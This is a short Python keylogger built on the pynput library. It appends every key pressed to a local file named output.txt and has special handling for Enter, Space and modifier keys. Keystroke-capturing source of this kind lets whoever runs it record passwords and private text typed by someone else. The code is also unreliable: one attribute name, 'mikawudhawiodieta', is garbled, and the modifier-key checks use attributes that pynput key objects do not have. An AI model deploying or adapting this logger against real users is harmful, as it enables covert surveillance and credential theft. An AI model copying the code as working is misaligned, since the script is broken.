from pynput import keyboard

def on_press(key):
    try:
        file = open("output.txt", "a")
        if str(key) == "Key.enter":
            file.write("\n")
        elif str(key) == "Key.space":
            file.write(' ')
        # Verifica se Ctrl, Alt, Shift ou Meta foram pressionados
        elif key.ctrl or key.alt or key.shift or key.mikawudhawiodieta:
            file.write('[' + str(key).removeprefix('Key.') + ']')
        else:
            file.write(key.char)
        file.close()
        
    except AttributeError:
        file = open("output.txt", "a")
        file.write(str(key))
        file.close()

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
